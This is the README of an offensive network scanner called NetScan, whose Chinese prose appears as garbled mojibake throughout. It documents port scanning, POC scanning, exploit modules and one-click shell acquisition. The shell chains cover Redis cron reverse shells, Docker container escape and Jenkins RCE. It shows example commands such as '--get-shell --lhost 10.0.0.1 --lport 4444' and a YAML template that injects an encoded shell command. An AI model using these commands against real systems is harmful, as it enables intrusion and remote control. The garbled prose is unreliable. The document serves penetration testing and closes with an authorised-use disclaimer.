# NetScan

涓€娆剧敤 Go 缂栧啓鐨勫叏鑳界綉缁滄壂鎻忓櫒锛屾彁渚?**鍛戒护琛岋紙CLI锛?* 涓?**鍥惧舰鐣岄潰锛圙UI锛?* 涓ょ褰㈡€侊紝闆嗕富鏈哄彂鐜般€佺鍙ｆ壂鎻忋€佹湇鍔¤瘑鍒€丱S 璇嗗埆銆佹紡娲炴娴嬨€佹紡娲炲埄鐢ㄣ€佷竴閿嬁 shell銆乄eb 渚﹀療銆佹彃浠?妯″潡/瀛楀吀/POC 骞冲彴鍖栨墿灞曚簬涓€浣撱€?
> **v5.0 鏂板**锛歯map 鏃犳巿鏉冨悎瑙勬暣鏀癸紙鎸囩汗鏇挎崲涓?wappalyzergo MIT + nerva Apache-2.0锛岃 `THIRD_PARTY_NOTICES.md`锛夛紱POC 寮曟搸 v3锛坧ayloads/鍙橀噺/绱㈠紩 DSL/extractors锛?,380 鏉＄湡瀹?nuclei 妯℃澘锛夛紱ffuf 铻嶅悎锛坄--fuzz-*` 鍏ㄥ姛鑳?+ GUI 鏍囩椤碉級锛汸ayloadsAllTheThings 鍐呯疆瀛楀吀锛坄builtin:`锛夛紱鍒╃敤閾炬鏋讹紙13 鏉″疄娴嬮€氳繃锛夛紱GUI 鏂板 Web 渚﹀療涓庢ā绯婃祴璇曟爣绛鹃〉銆?
---

## 鐩綍

- [鍔熻兘姒傝](#鍔熻兘姒傝)
- [蹇€熷紑濮媇(#蹇€熷紑濮?
- [鍛戒护琛岀敤娉昡(#鍛戒护琛岀敤娉?
- [婕忔礊妫€娴嬩笌鍒╃敤](#婕忔礊妫€娴嬩笌鍒╃敤)
- [涓€閿嬁 shell](#涓€閿嬁-shell)
- [骞冲彴鍖栨墿灞昡(#骞冲彴鍖栨墿灞?
- [鍥惧舰鐣岄潰鐢ㄦ硶](#鍥惧舰鐣岄潰鐢ㄦ硶)
- [缂栬瘧涓庡畨瑁匽(#缂栬瘧涓庡畨瑁?

---

## 鍔熻兘姒傝

### 1. 涓绘満鍙戠幇涓庣鍙ｆ壂鎻?
| 鍔熻兘 | 璇存槑 |
|------|------|
| TCP Connect | `-sT`锛堣法骞冲彴锛?|
| TCP SYN 鍗婂紑 | `-sS`锛圠inux+root锛?|
| UDP 鎵弿 | `-sU` |
| FIN/NULL/Xmas/ACK | `-sF/-sN/-sX/-sA`锛圠inux+root锛?|
| 涓绘満鍙戠幇 | ARP/ICMP/TCP锛坄-Pn` 璺宠繃銆乣-sn` 浠呭彂鐜帮級 |
| 瀹氭椂妯℃澘 | `-T 0~5` |
| 閫熺巼闄愬埗 / 闅忔満绔彛 | `--rate` / `--randomize` |
| 鎺掗櫎绔彛 | `--exclude-ports` |
| 浠ｇ悊 | `--proxy socks5://` / `http://` |
| 绔彛琛ㄨ揪寮?| `80 / 1-1000 / top-1000 / 22,80-90` |

### 2. 鎸囩汗涓庤瘑鍒?
| 鍔熻兘 | 璇存槑 |
|------|------|
| 绔彛鈫掓湇鍔℃槧灏?| IANA 鏈嶅姟鍚嶆敞鍐岃〃 + 閫氱敤绔彛绾﹀畾锛堜笉渚濊禆 nmap 鏁版嵁锛?|
| 鏈嶅姟/鐗堟湰璇嗗埆 | `-sV`锛?0+ 鑷爺姝ｅ垯鎺㈤拡 + **nerva Apache-2.0 鍏滃簳**锛?70+ 鍗忚锛?|
| **OS 绮剧‘璇嗗埆** | `-O`锛歋MB2/NTLM build 鍙?+ 涓绘満鍚?+ 瀹㈡埛绔?鏈嶅姟鍣ㄥ垽瀹?+ SSH banner 鍙戣鐗堟槧灏?|
| CMS/Web 鎸囩汗 | `--fp`锛堣嚜鐮?17 绉?CMS 瑙勫垯 + **wappalyzergo MIT** 鎶€鏈爤璇嗗埆锛?|
| Banner 鎶撳彇 | `--banner` |
| 鍙嶅悜 DNS | `--dns` |

### 3. 婕忔礊妫€娴嬩笌鍒╃敤

| 鍔熻兘 | 璇存槑 |
|------|------|
| 鏈巿鏉冭闂?POC | `--poc`锛?3 绉嶏細Redis/MongoDB/Docker/ES/Nacos...锛?|
| Web POC 鎵归噺鎵弿 | `--poc-scan`锛?,380 鏉＄湡瀹?nuclei 妯℃澘锛氬畼鏂?+ AllForOne MIT 瀛愰泦锛屾敮鎸佸璇锋眰/raw锛?|
| 瀹氬悜 POC 楠岃瘉 | `--poc-scan --poc-id <CVE/鍏抽敭瀛?`锛堜粎杩愯 id/name 鍖归厤鐨勬ā鏉匡級 |
| 澶栧甫妫€娴?OAST) | `--oast <ip:port>`锛堝唴缃?HTTP 鍥炶皟锛屾敮鎸?SSRF/RCE 澶栧甫妯℃澘锛涚鍙?0=闅忔満锛?|
| 婕忔礊鍒╃敤 | `--exploit <妯″潡>` / `auto` |
| 鍒╃敤妯″潡鍒楄〃 | `--exploit-list`锛?06 涓級 |
| 鍏ㄩ噺婕忔礊鎶ュ憡 | `--vuln-report`锛堝悕绉?澶嶇幇姝ラ锛?|
| 鐩爣婕忔礊鎵弿 | `--scan-vuln`锛堜粎鍛戒腑锛?|
| 寮卞彛浠ょ垎鐮?| `--brute`锛? 绉嶆湇鍔?+ 鍐呯疆瀛楀吀锛?|

### 4. 涓€閿嬁 shell

| 鏈嶅姟 | 绔彛 | 鍒╃敤閾?|
|------|------|--------|
| Redis | 6379 | 鏈巿鏉?鈫?鍐?cron 鍙嶅脊 |
| Docker | 2375/2376 | 鏈巿鏉?鈫?鐗规潈瀹瑰櫒閫冮€?|
| Jenkins | 8080/8090 | 鏈巿鏉冭剼鏈帶鍒跺彴 RCE |
| CouchDB | 5984 | query_servers 鍛戒护娉ㄥ叆 |
| ThinkPHP/PHPUnit/Struts2/鍛戒护娉ㄥ叆/WebShell | 80 绛?| 鍐呯疆 RCE 閾?|
| 鑷畾涔?| 浠绘剰 | 骞冲彴鍖?shells/*.yaml |

### 5. Web 渚﹀療

| 鍔熻兘 | 璇存槑 |
|------|------|
| 鐩綍鐖嗙牬 | `-dir`锛?80+ 璺緞锛?|
| Web 妯＄硦娴嬭瘯(ffuf 鍏ㄥ姛鑳? | `--fuzz-url http://target/FUZZ`锛氬璇嶈〃/澶氬叧閿瓧銆乧lusterbomb/pitchfork/sniper銆丒ncoder銆乺aw/鍘熷璇锋眰鏂囦欢銆佸欢鏃?闄愰€?瓒呮椂銆佸尮閰嶄笌杩囨护(鐘舵€佺爜/澶у皬/璇嶆暟/琛屾暟/姝ｅ垯/鑰楁椂)銆乤nd/or 缁勫悎銆佽嚜鍔ㄦ牎鍑嗐€侀€掑綊鐩綍銆丠TTP2/SNI/瀹㈡埛绔瘉涔?閲嶆斁浠ｇ悊銆丼craper銆佸璁?璋冭瘯鏃ュ織銆乯son/ejson/html/md/csv/ecsv 瀵煎嚭 |
| 鍐呯疆 payload 瀛楀吀 | `--fuzz-w builtin:<鍚嶇О>`锛?6 涓€愭枃浠惰鍙璁￠€氳繃鐨?PayloadsAllTheThings(MIT) 瀛楀吀锛屽 `builtin:springboot_actuator`銆乣builtin:param_miner_lowercase_headers`锛汫UI銆屽伐鍏封啋瀛楀吀銆嶅彲鏌ョ湅鍏ㄩ儴 |
| 瀛愬煙鍚嶇垎鐮?ffuf) | `--fuzz-mode subdomain --fuzz-sub example.com [--fuzz-scheme https] [--fuzz-port 443]`锛堟硾瑙ｆ瀽鑷姩鏍″噯锛?|
| 铏氭嫙涓绘満鐖嗙牬(ffuf) | `--fuzz-mode vhost --fuzz-vhost example.com --fuzz-url http://IP:PORT/`锛圚ost 澶?FUZZ 鐖嗙牬锛?|
| 瀛愬煙鍚嶇垎鐮?DNS) | `-sub --sub-depth` |
| HTTP 瀹夊叏澶存鏌?| `-web` |
| Whois / DNS | `-whois` / `-dnsq` |

### 6. 鍏跺畠宸ュ叿

| 鍔熻兘 | 璇存槑 |
|------|------|
| 鍙嶅脊 shell 鐢熸垚 | `-shell`锛?0 绉嶏級 |
| 璺敱璺熻釜 / Ping | `-tr` / `-sp` |
| 瀹氭椂鐩戞帶 | `--monitor --interval` |

### 7. 杈撳嚭涓庡瓨鍌?
| 鍔熻兘 | 璇存槑 |
|------|------|
| JSON/XML/grepable/CSV/HTML | `-oJ/-oX/-oG/-oC/-oH` |
| SQLite 璧勪骇搴?| `--store / --history / --diff` |

---

## 蹇€熷紑濮?
```bash
# 鏌ョ湅鐗堟湰 / 瀹屾暣鍙傛暟甯姪
netscan -version
netscan -h

# 鏈€鍩烘湰: 鎵弿鍗曟満 1-1000 绔彛 + 鏈嶅姟/鐗堟湰璇嗗埆
netscan -target 192.168.1.1 -p 1-1000 -sV

# 缃戞 + OS 璇嗗埆
netscan -target 192.168.1.0/24 -p 22,80,443 -sV -O

# Web POC 妫€娴?鍏ㄩ噺妯℃澘)
netscan -target 192.168.1.1 -p 80 --poc

# 瀹氬悜 POC + 鐪熷疄鍒╃敤閾?杈撳嚭璇佹嵁)
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773
netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773
```

GUI 鐗堟湰鍙屽嚮 `netscan-gui-windows-x64.exe` 鍚姩銆?
---

## 鍛戒护琛岀敤娉?
### 杈撳叆鏍煎紡锛堝厛鐪嬭繖閲岋級

| 鍙傛暟 | 鏀寔鐨勫啓娉?| 绀轰緥 |
|---|---|---|
| `-target` | 鍗曚釜 IP / 鍩熷悕 / IPv4 CIDR / IPv4 鑼冨洿 | `192.168.1.1`銆乣example.com`銆乣192.168.1.0/24`銆乣192.168.1.1-192.168.1.50`銆乣192.168.1.1-50` |
| `-p` | 鍗曠鍙?/ 閫楀彿鍒楄〃 / 鑼冨洿 / 鏈嶅姟鍚嶏紝鍙贩鐢?| `80`銆乣80,443`銆乣1-1000`銆乣http,ssh,3306`銆乣22,8000-8100` |
| `-oH` | HTML 鎶ュ憡杈撳嚭鏂囦欢 | `-oH report.html` |

鎵弿绫诲瀷锛歚-sT` TCP 杩炴帴鎵弿锛堥粯璁わ級銆乣-sU` UDP銆乣-Pn` 璺宠繃涓绘満鍙戠幇銆乣-T4` 鎻愰€燂紱
璇嗗埆锛歚-sV` 鏈嶅姟涓庣増鏈€乣-O` 鎿嶄綔绯荤粺銆乣--fp` CMS/Web 鎸囩汗銆乣--banner` Banner 鎶撳彇銆?
### 甯哥敤鍛戒护閫熸煡

```bash
# ---- 鎵弿 ----
netscan -target 192.168.1.1 -p 1-1000 -sT -sV -O
netscan -target 192.168.1.0/24 -p 22,80,443 -sT -sV
netscan -target 192.168.1.1 -p 53,123 -sU
netscan -target example.com -p 80 --fp --banner -oH report.html

# ---- 婕忔礊妫€娴?POC / 婕忔礊搴? ----
netscan -target 192.168.1.1 -p 80 --poc                 # 鍏ㄩ儴鍐呯疆妯℃澘(5,380)
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773   # 鍙窇鎸囧畾 CVE/妯℃澘 ID
netscan -target 192.168.1.1 -p 8080 --poc-id CVE-2021-41773 --poc-debug  # 閫愯姹傝皟璇?netscan -target 192.168.1.1 -p 80 --poc --oast 192.168.1.10:9999        # 甯?OAST 鍥炶皟(绔彛 0=闅忔満)
netscan -target 192.168.1.1 -p 80 --scan-vuln            # 鍐呯疆婕忔礊搴撴壂鎻?浠呭懡涓?澶嶇幇姝ラ)

# ---- 鍒╃敤 ----
netscan --exploit-list                                  # 鍒楀嚭鍙敤鍒╃敤閾?CVE)涓庢ā鍧?netscan -target 192.168.1.1 -p 8080 --exploit CVE-2021-41773   # 鎵ц鐪熷疄鍒╃敤閾惧苟鎵撳嵃璇佹嵁
netscan -target 192.168.1.1 -p 6379 --exploit redis-write-shell

# ---- 涓€閿嬁 shell ----
netscan -target 192.168.1.1 -p 6379 --get-shell --lhost 10.0.0.1 --lport 4444
netscan -target 192.168.1.1 -p 2375 --get-shell --lhost 10.0.0.1 --lport 4444

# ---- Web 渚﹀療 ----
netscan -target example.com -p 80 -dir     # 鐩綍鐖嗙牬
netscan -sub example.com --sub-depth 2     # 瀛愬煙鍚嶇垎鐮?鍙寜闇€鍔?--sub-depth)
netscan -target example.com -whois
netscan -target example.com -dnsq

# ---- 妯＄硦娴嬭瘯(ffuf) ----
netscan -h | findstr fuzz                  # 鏌ョ湅鍏ㄩ儴 --fuzz-* 鍙傛暟
```

> 鎻愮ず锛歅OC 妫€娴嬮粯璁ゅ彧瀵瑰凡璇嗗埆鐨?HTTP 鏈嶅姟鐢熸晥锛涚洰鏍囩鍙ｈ鏄庣‘鐢?`-p` 鎸囧畾銆?> 闇€瑕佹寚瀹氭ā鏉垮簱/瀛楀吀/鎻掍欢鐩綍鏃讹紝瑙佷笅鏂囥€屽钩鍙板寲鎵╁睍銆嶃€?
## 骞冲彴鍖栨墿灞?
鎵€鏈夋墿灞曢兘閫氳繃 YAML/JSON 鏂囦欢鐑彃鎷旓紝**鏃犻渶鏀?Go 浠ｇ爜**锛?
| 瀛愬懡浠?| 鐩綍 | 璇存槑 |
|--------|------|------|
| `module list/add/remove` | `modules/` | 婕忔礊妫€娴?鍒╃敤妯″潡 |
| `shell list/add/remove` | `shells/` | 涓€閿嬁 shell 閾?|
| `dict list/add` | `dicts/` | 寮卞彛浠ゅ瓧鍏?|
| `pocs list/add/remove` | `pocs/` | POC 妯℃澘 |
| `plugin list/install/remove/update` | `plugins/` | 鎻掍欢 |

### 鎻掍欢绫诲瀷(plugins/*.yaml)

| 绫诲瀷 | 璇存槑 |
|------|------|
| `poc` / `exploit` | 鑷畾涔夋紡娲炴娴?鍒╃敤锛堝鐢?POC 妯℃澘寮曟搸锛宍request`/`response` 瀛楁锛?|
| `report` | 鑷畾涔夋姤鍛婏紙`template` 瀛楁锛孏o template 娓叉煋鎶ュ憡鏂囦欢锛?|
| `output` | 鑷畾涔夎緭鍑烘牸寮忥紙`template` 瀛楁锛岄€愯娓叉煋缁撴灉锛?|
| `notification` | 閫氱煡锛坄webhook` 瀛楁锛屾壂鎻忓畬鎴愬悗鎺ㄩ€佺粨鏋?JSON锛?|

杩滅▼鎻掍欢甯傚満锛歚netscan --plugin-market http://host:port ...`锛屼粠杩滅▼鎷夊彇鎻掍欢鍒楄〃涓庢枃浠躲€?
### 鑷畾涔夋紡娲炴ā鍧?modules/*.yaml)

```yaml
id: custom-vuln
name: 鑷畾涔夋紡娲?type: exploit        # detect / exploit
severity: critical
method: GET
path: /custom-endpoint
match:
  - "root:"
```

### 鑷畾涔夋嬁 shell 閾?shells/*.yaml)

```yaml
id: my-rce
name: 鎴戠殑RCE
port: 8000
detect_path: /ping
detect_match: "pong"
steps:
  - method: GET
    path: /exec?cmd={{SHELL_ENC}}   # {{LHOST}} {{LPORT}} {{SHELL}} {{SHELL_ENC}}
```

---

## 鍥惧舰鐣岄潰鐢ㄦ硶

鍙屽嚮 `netscan-gui-windows-x64.exe`锛屼富瑕佸尯鍩燂細

- **鎵弿**锛氱洰鏍?绔彛/鎶€鏈?璇嗗埆/妫€娴嬮厤缃?+ 瀹炴椂缁撴灉琛ㄦ牸锛堝惈 OS 绮剧‘璇嗗埆銆侀珮鍗辨爣璁帮級
- **婕忔礊鍒╃敤**锛氱垎鐮淬€佹紡娲炲埄鐢?auto/鎸囧畾)銆佸弽寮?shell 鐢熸垚銆?*涓€閿嬁 shell**銆?*鎵弿鐩爣婕忔礊**銆?*婕忔礊鎶ュ憡**
- **璧勪骇鍘嗗彶**锛歋QLite 鍘嗗彶鏌ヨ
- **鎻掍欢**锛氭彃浠?POC/瀛楀吀/妯″潡/鎷?shell 閾剧鐞?
---

## 缂栬瘧涓庡畨瑁?
```bash
# CLI(绾?Go, 浜ゅ弶缂栬瘧)
go build -o netscan ./cmd/cli

# GUI(WebView, 浠呮湰鏈?
go build -ldflags "-H windowsgui" -o netscan-gui ./cmd/gui
```

### 鏋勫缓鑴氭湰

| 鑴氭湰 | 骞冲彴 | 浜х墿 |
|------|------|------|
| `buildcli.ps1` / `buildcli.sh` | Windows / Linux路macOS | 浜ゅ弶缂栬瘧 17 骞冲彴 CLI |
| `buildgui.ps1` / `buildgui.sh` | Windows / Linux路macOS | 鏈満鏋勫缓 GUI锛堝崟骞冲彴锛?|

```bash
# Windows
powershell -ExecutionPolicy Bypass -File buildcli.ps1
powershell -ExecutionPolicy Bypass -File buildgui.ps1

# Linux / macOS
./buildcli.sh
./buildgui.sh
```

### 浜ゅ弶缂栬瘧

CLI 宸茶鐩?17 骞冲彴锛歐indows/Linux/macOS/FreeBSD/NetBSD/OpenBSD 脳 x64/x86/arm64锛坢acOS 鏃?x86锛夈€?
### 鍓嶇疆鏉′欢

- Go 1.25+
- GUI 缂栬瘧闇€ C++ 缂栬瘧鍣?+ WebView 杩愯鏃讹紙Windows 闇€ WebView2锛?
---

## 鍏嶈矗澹版槑

鏈伐鍏蜂粎渚涚綉缁滅鐞嗗憳杩涜鎺堟潈鐨勫畨鍏ㄨ瘎浼颁笌缃戠粶璇婃柇浣跨敤銆傝鍕垮湪鏈幏寰楁巿鏉冪殑鎯呭喌涓嬪浠栦汉缃戠粶杩涜鎵弿鎴栧埄鐢紝鍚﹀垯鍙兘瑙︾姱娉曞緥銆備娇鐢ㄨ€呴』鑷鎵挎媴鍏ㄩ儴璐ｄ换銆?
